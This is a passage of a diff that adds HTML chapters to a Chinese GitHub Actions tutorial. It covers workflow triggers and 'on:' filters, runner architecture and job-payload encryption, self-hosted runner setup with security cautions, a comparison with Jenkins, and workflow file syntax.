+<th>触发事件</th>
+<th>workflow 文件来自哪个 commit</th>
+<th><code>GITHUB_SHA</code> / <code>github.sha</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>push</code></td>
+<td><strong>被推送的那个 commit</strong></td>
+<td>推送后的 commit（<code>after</code>）</td>
+</tr>
+<tr>
+<td><code>pull_request</code></td>
+<td><strong>PR 的合并提交</strong>（<code>refs/pull/N/merge</code>，即 base + PR 改动的临时合并结果）</td>
+<td>该合并 commit</td>
+</tr>
+<tr>
+<td><code>pull_request_target</code></td>
+<td><strong>base 仓库的默认分支</strong></td>
+<td>base 仓库默认分支的最后一个 commit</td>
+</tr>
+<tr>
+<td><code>schedule</code></td>
+<td>默认分支</td>
+<td>默认分支最后一个 commit</td>
+</tr>
+<tr>
+<td><code>workflow_dispatch</code></td>
+<td>默认分支（文件不存在于默认分支时，UI 上连按钮都不会出现）</td>
+<td>默认分支最后一个 commit</td>
+</tr>
+<tr>
+<td><code>release</code> / <code>issues</code> / <code>issue_comment</code></td>
+<td>默认分支</td>
+<td>默认分支最后一个 commit</td>
+</tr>
+<tr>
+<td><code>workflow_run</code></td>
+<td>默认分支</td>
+<td>默认分支最后一个 commit</td>
+</tr>
+<tr>
+<td><code>workflow_call</code></td>
+<td>调用方的 commit</td>
+<td>继承调用方</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>为什么这件事重要？</strong> 因为它决定了&quot;谁能控制你的 workflow 内容&quot;。</p>
+<ul>
+<li><code>push</code>：只有能推送的人才改得动 workflow，天然可信。</li>
+<li><code>pull_request</code>：workflow 文件取自合并提交，<strong>PR 里的 workflow 改动会生效</strong>。但平台有兜底——来自 fork 的 PR，secrets 一律不下发、<code>GITHUB_TOKEN</code> 强制降级为只读，且 <code>permissions:</code> 无法把它提权回来。</li>
+<li><code>pull_request_target</code>：workflow 文件取自<strong>受信任的默认分支</strong>，因此可以拿到 secrets 和可写 token。这个特性是设计给&quot;给 PR 打标签/发评论&quot;这类不需要 checkout 代码的场景的——<strong>一旦你去 checkout 了 PR 里的代码并执行，就等于把 secrets 交给了陌生人</strong>。详见 8.5。</li>
+</ul>
+<h3 id="ch-4-4">4.4 第四步：事件匹配 workflow 的 <code>on:</code> 过滤器</h3>
+<p>拿到事件和 workflow 文件后，GitHub 逐个检查每个 workflow 的 <code>on:</code> 是否匹配。</p>
+<pre><code class="language-yaml">on:
+  push:                          # 事件名
+    branches: [main, 'release/*']  # 分支过滤器
+    paths:                         # 路径过滤器
+      - 'doc/**'
+      - '!doc/**/*.draft.md'       # 前缀 ! 表示排除（后面的规则优先）
+    tags-ignore: ['v*-alpha']      # tag 过滤器
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+</code></pre>
+<p><strong>四个必须知道的语义细节：</strong></p>
+<p><strong>① <code>branches</code> 和 <code>paths</code> 同时存在时是 AND 关系，不是 OR。</strong></p>
+<pre><code class="language-yaml">on:
+  push:
+    branches: [main]
+    paths: ['src/**']
+</code></pre>
+<p>含义是&quot;推到 main <strong>且</strong> 这次推送改了 src 下的文件&quot;，不是&quot;推到 main <strong>或</strong> 改了 src&quot;。想让两个条件各自触发，得写两个独立的 <code>on</code> 分支或两个 workflow。</p>
+<p><strong>② <code>paths</code> 的判断依据是本次推送的 commits 列表。</strong></p>
+<p>GitHub 汇总所有 commit 的 <code>added</code> / <code>removed</code> / <code>modified</code> 字段去匹配 glob。所以：</p>
+<ul>
+<li>推送一个没有文件变化的 commit（比如 <code>git commit --allow-empty</code>），<code>paths</code> 永远不会命中。</li>
+<li>推送 3 个 commit，其中任意一个改了 <code>src/</code>，<code>paths: ['src/**']</code> 就会命中。</li>
+</ul>
+<p><strong>③ glob 语法有坑：<code>*</code> 不跨 <code>/</code>。</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>模式</th>
+<th>匹配</th>
+<th>不匹配</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>doc/*.md</code></td>
+<td><code>doc/a.md</code></td>
+<td><code>doc/ai/b.md</code></td>
+</tr>
+<tr>
+<td><code>doc/**</code></td>
+<td><code>doc/ai/b.md</code>、<code>doc/a.md</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>**.js</code></td>
+<td>任意层级的 <code>.js</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>!doc/vendor/**</code></td>
+<td>（排除）</td>
+<td>—</td>
+</tr>
+</tbody>
+</table></div>
+<p>以 <code>*</code> 或 <code>!</code> 开头的模式<strong>必须加引号</strong>，否则 YAML 会把 <code>*</code> 当别名、把 <code>!</code> 当标签解析，直接报错。</p>
+<p><strong>④ 事件还分「活动类型」（activity types）。</strong></p>
+<p><code>push</code> / <code>schedule</code> 只有一种类型；但 <code>pull_request</code> 有 <code>opened</code>、<code>synchronize</code>（PR 有新提交）、<code>reopened</code>、<code>closed</code>、<code>labeled</code>、<code>ready_for_review</code> 等等。不写 <code>types:</code> 时只用默认的三种（<code>opened</code>/<code>synchronize</code>/<code>reopened</code>）——这就是为什么&quot;PR 被合并不触发 CI&quot;是常见困惑。</p>
+<p>如果 workflow 文件本身有语法错误（YAML 缩进、未知字段、<code>uses</code> 引用了不存在的 action），这个 workflow <strong>不会启动</strong>，且错误只会显示在 Actions 页面的顶部提示里，不会给你发通知。这是&quot;我推了代码但什么都没发生&quot;的第一大原因。</p>
+<h3 id="ch-4-5">4.5 第五步：创建 run、拆分 job、入队调度</h3>
+<p>匹配成功后，GitHub 创建一个 <strong>workflow run</strong>，然后：</p>
+<ol>
+<li><strong>构建 DAG</strong>。根据 <code>needs:</code> 关系把 job 排成有向无环图。没有 <code>needs</code> 关系的 job 之间没有边，可以并行。</li>
+<li><strong>逐个 job 找 runner</strong>。对每个 job，服务端按 <code>runs-on</code> 的标签在 runner 池里挑一台匹配的机器。</li>
+<li><strong>入队等待</strong>。如果暂时没有空闲 runner（或并发配额已满），job 停在 <code>Queued</code> 状态。UI 上你会看到黄色圆点。</li>
+</ol>
+<pre><code>workflow run 创建
+        │
+        ├──► job: build ──► 找 ubuntu-latest ──► 有空闲？ ──是──► 派发
+        │                                            │
+        │                                           否
+        │                                            ▼
+        │                                         排队 Queued
+        │
+        └──► job: test ───► needs: build ──► 等待 build 完成 ──► 再走上面的流程
+</code></pre>
+<p>并发上限取决于套餐（Free 20 / Pro 40 / Team 60 / Enterprise 500，其中 macOS 单独限 5）。超出后 job 排队，<strong>不会失败</strong>，但会一直等到有额度。</p>
+
+      </section>
+
+      <section class="chapter" id="ch-5">
+        <div class="chapter-head"><span class="chapter-no">05</span><h2>五、Runner：任务究竟跑在哪里</h2></div>
+<p>第四步结束时，job 还在 GitHub 的服务器上排队。它必须被送到一台真实的机器上执行。这一章讲这台机器从哪来、怎么接到任务、怎么把结果传回来。</p>
+<h3 id="ch-5-1">5.1 GitHub 托管 runner 的真相</h3>
+<p>当你写 <code>runs-on: ubuntu-latest</code> 时，实际发生的是：</p>
+<pre><code>GitHub 调度器
+      │  &quot;给我一台打了 ubuntu-24.04 标签的机器&quot;
+      ▼
+Azure 虚拟机池
+      │  启动一台预装了 runner 应用的 VM
+      │  （runner 应用是 Azure Pipelines Agent 的一个 fork）
+      ▼
+┌──────────────────────────────────────────┐
+│  Azure VM   4 vCPU / 16 GB RAM / 14 GB   │
+│  ┌────────────────────────────────────┐  │
+│  │ actions/runner  (~/actions-runner) │  │
+│  │  ├── bin/Runner.Listener           │  │
+│  │  └── bin/Runner.Worker             │  │
+│  ├────────────────────────────────────┤  │
+│  │ /home/runner/work/&lt;repo&gt;/&lt;repo&gt;     │  │  ← 你的 GITHUB_WORKSPACE
+│  │   └── 你 checkout 下来的代码          │  │
+│  └────────────────────────────────────┘  │
+│  预装工具链：Node / Python / Go / Java /  │
+│  Docker / gcc / cmake / git / gh ...     │
+└──────────────────────────────────────────┘
+      │  job 结束
+      ▼
+   销毁整个 VM（对用户透明）
+</code></pre>
+<p>几个关键事实：</p>
+<ul>
+<li><strong>每台机器只跑一个 job</strong>。job 结束后 VM 被销毁，下一个 job 拿到的是全新实例。这解决了&quot;环境漂移&quot;问题——但也意味着<strong>任何没被缓存的下载都要重来</strong>（这正是 cache 存在的理由）。</li>
+<li><strong>标准配置是 4 vCPU / 16 GB / 14 GB SSD</strong>（公开仓库），arm64 Linux 同样规格；<strong>私有仓库是 2 vCPU / 8 GB</strong>，价格相同但算力减半。</li>
+<li><strong>macOS runner 是 3 核 M1 / 7 GB</strong>，比 Linux 弱得多，但价格贵 10 倍（$0.062/分钟），并且有&quot;macOS 并发上限 5&quot;的硬约束。</li>
+<li><strong><code>ubuntu-slim</code></strong> 是新出现的低成本选项：1 vCPU / 5 GB 的<strong>容器</strong>（不是 VM），作业超时只有 15 分钟，无特权（不能用 Docker-in-Docker、不能挂载文件系统）。适合跑轻量的 lint 和脚本。</li>
+<li>Linux / macOS runner 有<strong>免密 sudo</strong>，Windows runner 以管理员身份运行且关闭 UAC——这也是&quot;不要把公开仓库的 runner 当安全边界&quot;的原因之一。</li>
+<li>关于 macOS 机器放在哪：runner 参考页写的是&quot;GitHub 自有的 macOS 云&quot;，概念页写的是&quot;Azure 数据中心&quot;。<strong>官方文档自身措辞不一致</strong>，本文不做断言。</li>
+<li>你<strong>无法 SSH 进托管 runner</strong>（它不对公网开放入站连接）。要在里面交互式调试只能靠 <code>tmate</code> 之类的 action 反向连出来。</li>
+</ul>
+<h3 id="ch-5-2">5.2 Runner 如何领到任务：长轮询 + 载荷加密</h3>
+<p>这一段是理解 GitHub Actions 安全模型的关键，也是最容易被忽略的工程细节。</p>
+<p><strong>问题</strong>：job 载荷里包含 <code>GITHUB_TOKEN</code>（一个可写你仓库的临时令牌）。如果 runner 只是&quot;从某个 URL 拉一个明文 JSON&quot;，那么任何能劫持这条链路的人都能拿到令牌——哪怕走的是 HTTPS，也得信任链路上的每一跳。</p>
+<p><strong>解法</strong>：在应用层再加一层端到端加密，密钥只有 GitHub 和这台 runner 知道。</p>
+<pre><code>Runner 注册时（config.sh 阶段）
+  ├─ 本地生成 RSA 密钥对
+  ├─ 私钥存在 .credentials_rsaparams（只在本机）
+  └─ 公钥（modulus + exponent）上传给服务端注册
+
+运行时（每个 job）
+  GitHub Actions 服务                        Runner
+        │                                       │
+        │ ① 建会话，返回 Session.EncryptionKey    │
+        │    = AES 会话密钥，用 runner 公钥加密    │
+        │    （字段 EncryptionKey.Encrypted=true）│
+        ├──────────────────────────────────────►│
+        │                                       │ ② 用 RSA 私钥解密出 AES 密钥
+        │                                       │    （OAEP-SHA256；FIPS 模式下强制）
+        │ ③ 长轮询 GetRunnerMessageAsync          │
+        │ ◄──────────────────────────────────────┤
+        │                                       │
+        │ ④ 返回加密的 job 载荷                    │
+        │    （AES 加密的 body，base64 + 每消息 IV）│
+        ├──────────────────────────────────────►│
+        │                                       │ ⑤ AES 解密
+        │                                       │    拿到：job 定义、环境变量、
+        │                                       │    GITHUB_TOKEN、workspace 路径
+        │                                       │
+        │                                       │ ⑥ 执行 steps，流式回传日志
+        │ ◄──────────────────────────────────────┤
+        │                                       │
+</code></pre>
+<p>几个值得记住的点：</p>
+<ul>
+<li>长轮询（long poll）意味着 runner <strong>主动</strong>向 GitHub 建立一条长时间挂起的请求。它不需要对外暴露任何端口，所以托管 runner 能在 NAT 后面工作。</li>
+<li>现在存在<strong>两代协议</strong>：旧的 <code>RunnerServer</code> 和新的 <code>BrokerServer</code>。服务端可以在会话中下发 <code>BrokerMigrationMessage</code>，让 runner 切换到 broker 端点。这是渐进式迁移。</li>
+<li>会话有看门狗：如果 30 分钟内没取到任何消息，会话会被判定失效。</li>
+<li>结论：<strong>job 载荷是端到端加密到具体那台 runner 的</strong>，不只是靠 TLS 保护。这是&quot;为什么 GitHub 敢把 token 放进 job 里&quot;的答案。</li>
+</ul>
+<h3 id="ch-5-3">5.3 <code>runs-on</code> 的标签匹配规则</h3>
+<p><code>runs-on</code> 不是&quot;选操作系统&quot;，而是<strong>标签匹配</strong>：</p>
+<pre><code class="language-yaml"># 以下三种写法任选其一（同一个 job 里只能写一个 runs-on）
+
+runs-on: ubuntu-latest              # 单个标签
+runs-on: [self-hosted, linux, gpu]  # 多个标签 → AND 关系（必须同时满足）
+runs-on: ${{ matrix.os }}           # 可以是表达式
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>标签</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ubuntu-latest</code> / <code>ubuntu-24.04</code> / <code>ubuntu-26.04</code> / <code>ubuntu-22.04</code></td>
+<td>GitHub 托管的 Linux x64</td>
+</tr>
+<tr>
+<td><code>ubuntu-24.04-arm</code></td>
+<td>GitHub 托管的 Linux arm64</td>
+</tr>
+<tr>
+<td><code>windows-latest</code>（= 2025）/ <code>windows-2022</code></td>
+<td>GitHub 托管的 Windows</td>
+</tr>
+<tr>
+<td><code>macos-latest</code>（= macos-26）/ <code>macos-15</code> / <code>macos-26-intel</code></td>
+<td>GitHub 托管的 macOS</td>
+</tr>
+<tr>
+<td><code>ubuntu-slim</code></td>
+<td>1 核容器 runner，15 分钟超时</td>
+</tr>
+<tr>
+<td><code>self-hosted</code></td>
+<td>自建 runner</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout warning"><p class="callout-title"><code>-latest</code> 的陷阱</p>
+<p><code>ubuntu-latest</code> 指的是&quot;GitHub 提供的最新<strong>稳定</strong>镜像&quot;，不是&quot;厂商最新 OS&quot;。它的指向会随时间变化（曾经从 20.04 漂到 22.04 再漂到 24.04），<strong>某天你的构建可能因为底层镜像换版而失败</strong>。对稳定性要求高的项目，固定 <code>ubuntu-24.04</code> 这样的具体版本更安全。</p>
+</div>
+<h3 id="ch-5-4">5.4 Self-hosted runner：把机器接到 GitHub 上</h3>
+<p>当你需要内网资源、特殊硬件、GPU、或者想省钱时，可以把自己的机器注册成 runner。</p>
+<p><strong>注册流程：</strong></p>
+<pre><code class="language-bash"># ① 在 GitHub 仓库 → Settings → Actions → Runners → New self-hosted runner
+#    页面会给出一个临时注册 token
+
+# ② 在目标机器上
+mkdir actions-runner &amp;&amp; cd actions-runner
+curl -o actions-runner.tar.gz -L \
+  https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
+tar xzf actions-runner.tar.gz
+
+# ③ 配置（--ephemeral 表示跑完一个 job 就注销，推荐用于自动扩缩容场景）
+./config.sh --url https://github.com/chunyujin295/yj-knowledge-bank \
+            --token &lt;REGISTRATION_TOKEN&gt; \
+            --labels self-hosted,linux,deploy-target \
+            --ephemeral
+
+# ④ 安装为系统服务
+sudo ./svc.sh install
+sudo ./svc.sh start
+</code></pre>
+<p>然后在 workflow 里：</p>
+<pre><code class="language-yaml">jobs:
+  deploy:
+    runs-on: [self-hosted, deploy-target]
+    steps:
+      - run: echo &quot;我在自己的机器上跑&quot;
+</code></pre>
+<p><strong>必须知道的几点：</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>事项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>版本要求</strong></td>
+<td><code>actions/runner</code> 最新为 v2.337.0。Node 24 的 action（<code>setup-node@v5+</code>、<code>setup-python@v6+</code>）要求 runner ≥ v2.327.1；checkout v6 的 Docker 容器 git 认证要求 ≥ v2.329.0</td>
+</tr>
+<tr>
+<td><strong>自动更新</strong></td>
+<td>默认开启。如果关掉，必须在 <strong>30 天内</strong>手动升级，否则 runner 会被拒绝服务</td>
+</tr>
+<tr>
+<td><strong>作业时长</strong></td>
+<td>自建 runner 单个 job 最长 <strong>5 天</strong>（托管是 6 小时）；但 <code>GITHUB_TOKEN</code> 自建 runner 上最长只有 <strong>24 小时</strong></td>
+</tr>
+<tr>
+<td><strong>排队超时</strong></td>
+<td>自建 runner 的 job 排队超过 <strong>24 小时</strong>会被自动取消</td>
+</tr>
+<tr>
+<td><strong>⚠️ 安全红线</strong></td>
+<td><strong>绝对不要给公开仓库挂 self-hosted runner。</strong> 任何人都能开 PR，而 PR 里的代码会在你的机器上执行——这条路径能直接打进你的内网</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout warning"><p class="callout-title">关于自建 runner 的安全边界</p>
+<p>自建 runner 等于&quot;让 GitHub 上的陌生人有机会在你的机器上执行代码&quot;。如果一定要给公开仓库用：</p>
+<ul>
+<li>设置仓库级别只允许<strong>指定的人</strong>触发 workflow（Settings → Actions → 勾选 &quot;Require approval for all outside collaborators&quot;）</li>
+<li>使用 <code>--ephemeral</code> 并且每次跑完销毁容器/VM</li>
+<li><strong>永远不要给这台机器任何长期有效的凭证</strong></li>
+<li>最稳妥的做法是把它放进一个隔离的网络里，当作&quot;不可信执行环境&quot;对待</li>
+</ul>
+</div>
+<p><strong>Actions Runner Controller (ARC)</strong> 是官方给出的 Kubernetes 方案，用于大规模自建：</p>
+<pre><code>① Helm 安装 controller manager，创建 AutoscalingRunnerSet
+② Listener Pod 对 GitHub 开一条 HTTPS 长轮询，等 &quot;Job Available&quot;
+③ 收到后 Listener 去 patch EphemeralRunnerSet 的 replicas
+④ EphemeralRunnerSet 创建 Pod，通过 JIT 配置令牌注册 runner
+   （失败的 Pod 最多重试 5 次；24 小时内没有 runner 接单则任务被收回）
+⑤ runner 注册成功，领 job，执行，回传日志
+⑥ 成功后 controller 询问服务端能否删除，然后销毁 Pod
+</code></pre>
+<p>ARC 只以 OCI 包的形式发布在 GHCR 上（<code>gha-runner-scale-set-controller</code> 和 <code>gha-runner-scale-set</code> 两个 chart），当前版本线是 <code>gha-runner-scale-set-0.14.x</code>。</p>
+<h3 id="ch-5-5">5.5 与 Jenkins 的架构对比</h3>
+<p>理解了 GitHub Actions 的模型之后，和 Jenkins 对比会特别清晰：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Jenkins</th>
+<th>GitHub Actions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>调度器</strong></td>
+<td>自建 master 机器，你要维护它、备份它、给它打补丁</td>
+<td>GitHub 托管，零运维</td>
+</tr>
+<tr>
+<td><strong>执行器</strong></td>
+<td>自己准备 agent 机器，长期在线</td>
+<td>平台按需开 Azure VM，用完即毁</td>
+</tr>
+<tr>
+<td><strong>流水线定义</strong></td>
+<td><code>Jenkinsfile</code>（Groovy DSL，图灵完备）</td>
+<td>YAML（声明式，能力受限但更安全）</td>
+</tr>
+<tr>
+<td><strong>复用机制</strong></td>
+<td>共享库（Shared Library），需要自己维护版本</td>
+<td>action 市场 + composite action + reusable workflow</td>
+</tr>
+<tr>
+<td><strong>触发来源</strong></td>
+<td>SCM 轮询 / webhook 插件（需要额外配置）</td>
+<td>内建，仓库上的任何事件都能触发</td>
+</tr>
+<tr>
+<td><strong>凭证管理</strong></td>
+<td>Credentials 插件 + master 上的加密存储</td>
+<td><code>GITHUB_TOKEN</code> + Secrets + OIDC</td>
+</tr>
+<tr>
+<td><strong>隔离性</strong></td>
+<td>取决于你怎么配置 agent（常见做法是复用的）</td>
+<td>默认每个 job 一台干净机器</td>
+</tr>
+<tr>
+<td><strong>成本模型</strong></td>
+<td>机器固定成本（闲置也花钱）</td>
+<td>按分钟计费（公开仓库免费）</td>
+</tr>
+<tr>
+<td><strong>可编程性</strong></td>
+<td>强（Groovy 能写任意逻辑）</td>
+<td>弱（YAML 里不能写复杂逻辑，只能拆进 action/脚本）</td>
+</tr>
+<tr>
+<td><strong>本地方案</strong></td>
+<td>难</td>
+<td><code>act</code>（重实现了一个 runner，不保证完全一致）</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout"><p class="callout-title">一句话总结差异</p>
+<p>Jenkins 把复杂性交给你（你要维护调度器和 agent），换来的是完全的控制力；GitHub Actions 把调度器和执行环境都托管掉，换来的是简单，代价是&quot;你只能用它允许的方式表达流水线&quot;。</p>
+</div>
+      </section>
+
+      <section class="chapter" id="ch-6">
+        <div class="chapter-head"><span class="chapter-no">06</span><h2>六、工作流文件语法完全解剖</h2></div>
+<p>前五章讲的是&quot;为什么&quot;，这一章讲&quot;怎么写&quot;。</p>
+<h3 id="ch-6-1">6.1 一份最小可运行的工作流</h3>
+<pre><code class="language-yaml"># .github/workflows/hello.yml
+name: Hello World                    # ① workflow 的显示名
+
+on: push                             # ② 触发条件：任何分支的任何推送
+
+jobs:                                # ③ 一个或多个 job
+  hello:                             #    job 的 id（同文件内唯一）
+    runs-on: ubuntu-latest           # ④ 在哪台机器上跑
+    steps:                           # ⑤ 按顺序执行的步骤
+      - run: echo &quot;Hello from $(uname -a)&quot;      # 直接执行 shell 命令
+</code></pre>
+<p>把它放到仓库的 <code>.github/workflows/</code> 目录下推上去，Actions 页面就会出现一次运行。注意目录层级：<strong>必须是 <code>.github/workflows/</code></strong>，多一层少一层都不会被识别，且这个目录<strong>只能在默认分支上被发现</strong>（<code>workflow_dispatch</code> 的按钮尤为明显——文件不在默认分支，连按钮都不给你）。</p>
+<h3 id="ch-6-2">6.2 顶层字段</h3>
+<pre><code class="language-yaml">name: CI                             # workflow 名称（UI 显示）
+run-name: Deploy to ${{ inputs.env }} by @${{ github.actor }}   # 单次运行的名称
+on: [push, pull_request]             # 触发条件
+permissions:                         # 权限声明（见第八章）
+  contents: read
+env:                                 # 全局环境变量
+  NODE_VERSION: '22'
+defaults:                            # 所有 step 的默认值
+  run:
+    shell: bash
+    working-directory: ./app
+concurrency:                         # 并发控制
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+cache-mode: write                    # 缓存写入策略（新字段）
+jobs: { ... }
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>作用</th>
+<th>注意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name</code></td>
+<td>workflow 名</td>
+<td>显示在 UI 和 badges 上</td>
+</tr>
+<tr>
+<td><code>run-name</code></td>
+<td>单次运行的标题</td>
+<td>只能用 <code>github</code> 和 <code>inputs</code> 两个上下文</td>
+</tr>
+<tr>
+<td><code>on</code></td>
+<td>触发条件</td>
+<td>详见 4.4</td>
+</tr>
+<tr>
+<td><code>permissions</code></td>
+<td>权限声明</td>
+<td><strong>列了任何一个 scope，其余全部变成 <code>none</code></strong></td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>全局环境变量</td>
+<td>会传给所有 job 和 step</td>
+</tr>
+<tr>
+<td><code>defaults.run.working-directory</code></td>
+<td>默认工作目录</td>
+<td>省去每个 step 写 <code>cd</code></td>
+</tr>
+<tr>
+<td><code>concurrency</code></td>
+<td>并发组</td>
+<td>同组内互斥</td>
+</tr>
+<tr>
+<td><code>cache-mode</code></td>
+<td>缓存能力</td>
+<td><code>read</code> / <code>write</code> / <code>write-only</code> / <code>none</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong><code>concurrency</code> 是个人项目最实用、却最少被用的字段：</strong></p>
+<pre><code class="language-yaml">concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+</code></pre>
+<p>含义：同一个 workflow 在同一个分支上，<strong>新的一次运行会取消还在跑的旧运行</strong>。文档快速迭代时非常有用——连续推三次，只有最后一次跑完，前两次自动取消，省时间也省钱。</p>
+<p>几个细节：</p>
+<ul>
+<li><code>group</code> 名称<strong>大小写不敏感</strong>（<code>${{ github.ref }}</code> 里 <code>refs/heads/Main</code> 和 <code>main</code> 是同一组）。</li>
+<li>排队顺序按&quot;开始等待的时间&quot;先进先出，但<strong>不保证严格顺序</strong>。</li>
+<li><code>cancel-in-progress</code> 可以写表达式。</li>
+<li>新增的 <code>queue:</code> 字段：<code>single</code>（默认，只保留 1 个待运行）或 <code>max</code>（最多 100 个待运行）。<strong>它与 <code>cancel-in-progress: true</code> 冲突</strong>，同时写会直接报校验错误。</li>
+</ul>
+<h3 id="ch-6-3">6.3 job 层字段</h3>
+<pre><code class="language-yaml">jobs:
+  build:
+    name: 构建产物                      # 显示名（可用表达式）
+    runs-on: ubuntu-latest
+    needs: [lint, test]                # 依赖（形成 DAG）
+    if: ${{ github.event_name == 'push' }}
+    timeout-minutes: 30
+    concurrency:                       # job 级并发控制
+      group: build-${{ github.ref }}
+    continue-on-error: ${{ matrix.experimental }}
+    environment:                       # 关联环境（可用环境级 secrets + 审批）
+      name: production
+      url: https://codis.fun/yj-knowledge-bank
+    outputs:                           # 输出给下游 job
+      version: ${{ steps.meta.outputs.version }}
+    env:
+      BUILD_MODE: release
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        node: [20, 22, 24]
+        exclude:
+          - os: windows-latest
+            node: 20
+        include:                       # include 在 exclude 之后处理
+          - os: ubuntu-latest
+            node: 24
+            experimental: true
+    services:                          # 伴随的服务容器（数据库等）
+      postgres:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: postgres
+        ports: ['5432:5432']
+        options: &gt;-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+    container:                         # 在容器里跑所有 step
+      image: node:22-bookworm
+    steps: [ ... ]
+</code></pre>
+<p><strong>matrix 的展开过程</strong>（对应上面配置）：</p>
+<pre><code>os × node 全组合（2 × 3 = 6 个）：
+  ubuntu + 20     ubuntu + 22     ubuntu + 24
+  windows + 20    windows + 22    windows + 24
+
+exclude 移除：
+  windows + 20                                  ← 剩 5 个
+
+include 追加（在 exclude 之后）：
+  ubuntu + 24 + experimental:true   ← 与已有组合合并，不是新增
+  （若 include 写的是 os: macos-latest，则新增第 6 个组合）
+
+最终 5 个 job 并行执行，每个 job 拿到一组 matrix 值
+</code></pre>
+<p><strong>matrix 的三个要点：</strong></p>
+<ol>
+<li><strong>上限 256 个 job / 每次 workflow run</strong>。<code>os: [ubuntu, windows, macos] × node: [18,20,22,24] × db: [pg,mysql] = 24</code>，注意别让组合数失控。</li>
+<li><strong><code>exclude</code> 是部分匹配</strong>。只写 <code>node: 20</code> 会排除所有 node 为 20 的组合。</li>
+<li><strong><code>include</code> 后处理</strong>。所以它能&quot;撤销&quot;一个 exclude，也能给已存在的组合追加字段。</li>
+</ol>
+<p><strong>job 的执行顺序由 <code>needs</code> 决定：</strong></p>
+<pre><code>        ┌─────────┐
+        │  lint   │
+        └────┬────┘
+             │
+   ┌─────────┴─────────┐
+   ▼                   ▼
+┌──────┐           ┌──────┐
+│ test │           │build │      ← test 和 build 并行（互不依赖）
+└───┬──┘           └───┬──┘
+    └────────┬────────┘
+             ▼
+        ┌─────────┐
+        │ deploy  │  needs: [test, build]
+        └─────────┘
+</code></pre>
+<h3 id="ch-6-4">6.4 step 层字段</h3>
+<pre><code class="language-yaml">steps:
+  - name: 检出代码
+    uses: actions/checkout@v7
+    with:
+      fetch-depth: 0                   # 取全部历史（打 tag/生成 release notes 需要）
+      persist-credentials: false       # 不把 token 写进 git config（安全加固）
+
+  - name: 装依赖
+    run: npm ci
+    working-directory: ./web          # ✅ 正确做法：指定目录而不是 cd
+    shell: bash                        # bash / pwsh / python / sh / cmd
+    env:
+      NPM_CONFIG_REGISTRY: https://registry.npmmirror.com
+    timeout-minutes: 10
+    continue-on-error: true            # 失败了也继续后面的 step
+
+  - name: 读取上一步的输出
+    id: read                          # 有 id 才能被 steps.&lt;id&gt;.outputs 引用
+    run: echo &quot;ok&quot;
+</code></pre>
+<p><strong>关于 <code>shell</code></strong>：在 Linux/macOS 上默认是 <code>bash -e {0}</code>（<code>-e</code> 表示任一命令失败就整体失败）；Windows 默认是 <code>pwsh</code>。如果写 <code>shell: bash</code>，在 Windows 上会用一个特殊的 Git Bash 包装——行为与 Linux 的 bash 仍有差异，跨平台脚本要小心。</p>
+<h3 id="ch-6-5">6.5 表达式与上下文</h3>
+<p><code>${{ }}</code> 里的东西叫<strong>上下文（context）</strong>，一共 12 个：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>上下文</th>
+<th>内容</th>
+<th>典型用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>github</code></td>
+<td>事件与仓库信息</td>
+<td><code>github.sha</code>、<code>github.ref_name</code>、<code>github.event_name</code>、<code>github.event.pull_request.number</code></td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>环境变量</td>
+<td><code>env.NODE_VERSION</code></td>
+</tr>
+<tr>
+<td><code>vars</code></td>
+<td>仓库/组织级变量（非密）</td>
+<td><code>vars.DEPLOY_HOST</code></td>
+</tr>
+<tr>
+<td><code>secrets</code></td>
+<td>加密的秘密</td>
+<td><code>secrets.SSH_KEY</code></td>
+</tr>
+<tr>
+<td><code>job</code></td>
+<td>当前 job 状态</td>
+<td><code>job.status</code></td>
+</tr>
+<tr>
+<td><code>jobs</code></td>
+<td>reusable workflow 的输出</td>
+<td><code>jobs.&lt;id&gt;.outputs.x</code></td>
+</tr>
+<tr>
+<td><code>steps</code></td>
+<td>前面 step 的输出</td>
+<td><code>steps.meta.outputs.version</code></td>
+</tr>
+<tr>
+<td><code>runner</code></td>
+<td>当前 runner 信息</td>
+<td><code>runner.os</code>、<code>runner.temp</code>、<code>runner.debug</code></td>
+</tr>
+<tr>
+<td><code>strategy</code></td>
+<td>matrix 状态</td>
+<td><code>strategy.job-index</code></td>
+</tr>
+<tr>
+<td><code>matrix</code></td>
+<td>当前矩阵值</td>
+<td><code>matrix.node</code></td>
+</tr>
+<tr>
+<td><code>needs</code></td>
+<td>上游 job 的输出与结果</td>
+<td><code>needs.build.outputs.version</code></td>
+</tr>
+<tr>
+<td><code>inputs</code></td>
+<td><code>workflow_dispatch</code> / <code>workflow_call</code> 的输入</td>
+<td><code>inputs.environment</code></td>
+</tr>
